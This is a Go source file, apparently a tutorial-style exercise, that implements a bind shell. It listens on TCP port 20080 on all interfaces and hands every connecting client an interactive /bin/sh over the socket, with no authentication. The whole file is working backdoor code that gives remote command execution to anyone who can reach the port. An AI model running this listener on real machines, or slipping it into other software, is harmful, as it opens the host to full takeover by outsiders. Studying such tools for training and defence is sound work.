package main

import (
	"io"
	"log"
	"net"
	"os/exec"
)

func handle(conn net.Conn) {

	// Explicitly calling /bin/sh and using -i for interactive mode
	// so that we can use it for stdin and stdout.
	cmd := exec.Command("/bin/sh", "-i")

	// Set stdin to our connection
	rp, wp := io.Pipe()

	cmd.Stdin = conn
	cmd.Stdout = wp

	go io.Copy(conn, rp)

	// Run the command
	if err := cmd.Run(); err != nil {
		log.Fatalln(err)
	}
	defer conn.Close()
}

func main() {
	// Bind to TCP port 20080 on all interfaces.
	listener, err := net.Listen("tcp", ":20080")
	if err != nil {
		log.Fatalln("Unable to bind to port")
	}
	log.Println("Listening on 0.0.0.0:20080")

	for {
		// Wait for connection. Create net.Conn on connection established.
		conn, err := listener.Accept()
		log.Println("Received connection")
		if err != nil {
			log.Fatalln("Unable to accept connection")
		}
		// Handle the connection. Using goroutine for concurrency.
		go handle(conn)
	}
}
